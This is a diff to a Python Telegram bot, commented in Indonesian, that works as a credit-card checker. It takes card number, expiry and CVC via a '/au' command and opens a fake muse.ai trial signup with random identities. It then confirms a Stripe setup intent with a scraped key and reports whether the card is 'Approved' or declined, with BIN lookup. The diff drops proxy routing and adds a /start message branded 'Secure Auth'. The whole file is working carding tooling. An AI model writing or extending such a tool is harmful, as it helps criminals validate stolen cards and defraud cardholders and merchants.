@@ -9,20 +9,13 @@ from urllib.parse import urlencode
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-# --- KONFIGURASI DIBACA DARI ENVIRONMENT VARIABLES ---
+# --- KONFIGURASI DARI ENVIRONMENT VARIABLES (TANPA PROXY) ---
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 USER_COOKIE = os.getenv('USER_COOKIE')
 STRIPE_KEY = os.getenv('STRIPE_KEY')
-PROXY_USER = os.getenv('PROXY_USER')
-PROXY_PASS = os.getenv('PROXY_PASS')
-PROXY_HOST = os.getenv('PROXY_HOST')
-PROXY_PORT = os.getenv('PROXY_PORT')
 
-if not all([TELEGRAM_BOT_TOKEN, USER_COOKIE, STRIPE_KEY, PROXY_USER, PROXY_PASS, PROXY_HOST, PROXY_PORT]):
-    raise ValueError("Satu atau lebih environment variables (secrets) tidak ditemukan!")
-
-proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
-proxies = {"http://": proxy_url, "https://": proxy_url}
+if not all([TELEGRAM_BOT_TOKEN, USER_COOKIE, STRIPE_KEY]):
+    raise ValueError("Secrets TELEGRAM_BOT_TOKEN, USER_COOKIE, atau STRIPE_KEY tidak ditemukan!")
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -37,7 +30,6 @@ def get_random_user():
 
 def get_bin_info(client: httpx.Client, bin_number: str):
     try:
-        # 'proxies' TIDAK diperlukan di sini, karena sudah diatur di client
         response = client.get(f'https://data.handyapi.com/bin/{bin_number}')
         if response.status_code == 200:
             data = response.json(); country_flag = data.get('Country', {}).get('Flag', '❓')
@@ -52,7 +44,6 @@ def process_card(client: httpx.Client, cc, mm, yy, cvc):
     stripe_headers = {'Host': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'Stripe-Version': '2019-05-16'}
     try:
         start_payload = {"email": email, "name": full_name, "trial": 1, "tier": "basic", "cost_month": 16, "duration": 2629800, "access": "", "referral": "", "pm": "", "ab_pricing": 0, "ab_landing": 0}
-        # 'proxies' TIDAK diperlukan di sini
         response_start = client.post('https://muse.ai/api/pay/start', headers=muse_headers, json=start_payload, timeout=30)
         response_start.raise_for_status()
         start_data = response_start.json()
@@ -60,7 +51,6 @@ def process_card(client: httpx.Client, cc, mm, yy, cvc):
         if not all([setup_intent_id, client_secret]): return {"status": "error", "message": "Failed to get Setup Intent from muse.ai."}
         stripe_payload_data = {'payment_method_data[type]': 'card', 'payment_method_data[billing_details][name]': full_name, 'payment_method_data[billing_details][email]': email, 'payment_method_data[card][number]': cc, 'payment_method_data[card][cvc]': cvc, 'payment_method_data[card][exp_month]': mm, 'payment_method_data[card][exp_year]': yy, 'payment_method_data[payment_user_agent]': 'stripe.js/22a1c02c9a; stripe-js-v3/22a1c02c9a; card-element', 'payment_method_data[time_on_page]': str(random.randint(40000, 90000)), 'expected_payment_method_type': 'card', 'use_stripe_sdk': 'true', 'key': STRIPE_KEY, 'client_secret': client_secret}
         stripe_payload = urlencode(stripe_payload_data)
-        # 'proxies' TIDAK diperlukan di sini
         response_stripe = client.post(f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm', headers=stripe_headers, content=stripe_payload, timeout=30)
         stripe_data = response_stripe.json()
         if stripe_data.get("status") == "succeeded": return {"status": "approved", "code": "succeeded"}
@@ -71,6 +61,18 @@ def process_card(client: httpx.Client, cc, mm, yy, cvc):
     except httpx.HTTPStatusError as e: return {"status": "error", "message": f"HTTP Error: {e.response.status_code} - {e.response.text}"}
     except Exception as e: logger.error(f"Unexpected error in process_card: {e}"); return {"status": "error", "message": f"An unexpected error occurred: {e}"}
 
+# --- HANDLER UNTUK PERINTAH /start ---
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Mengirim pesan selamat datang saat perintah /start dijalankan."""
+    welcome_text = """👋 Welcome to Secure Auth!
+
+Available Commands:
+
+/au cc|mm|yy|cvc
+
+Bot by: Secure Auth Team"""
+    await update.message.reply_text(welcome_text)
+
 async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message, user = update.message, update.message.from_user; card_info = " ".join(context.args)
     if not card_info: await message.reply_text("❌ Format salah.\nContoh: `/au 434769...|01|29|422`", parse_mode='Markdown'); return
@@ -80,13 +82,8 @@ async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if len(parts) != 4: await sent_message.edit_text("❌ Format tidak valid."); return
         cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
         if len(yy) == 2: yy = "20" + yy
-        
-        # --- PERUBAHAN UTAMA DI SINI ---
-        # `proxies` didefinisikan saat membuat client, bukan di setiap .post() atau .get()
-        with httpx.Client(http2=True, proxies=proxies) as client:
-            result = process_card(client, cc, mm, yy, cvc)
-            bin_info = get_bin_info(client, cc[:6])
-            
+        with httpx.Client(http2=True) as client:
+            result = process_card(client, cc, mm, yy, cvc); bin_info = get_bin_info(client, cc[:6])
         cc_masked = f"{cc[:6]}...{cc[-4:]}"
         if result['status'] == 'approved': status_text, result_text, code_text = "Approved! ✅", "Succeeded", result['code']
         elif result['status'] == 'decline': status_text, result_text, code_text = "Decline! ❌", result['code'], result['code']
@@ -97,7 +94,12 @@ async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    
+    # --- PERUBAHAN UTAMA DI SINI ---
+    # Mendaftarkan handler untuk /start dan /au
+    application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("au", au_command))
+    
     print("Bot berjalan...")
     application.run_polling()
 
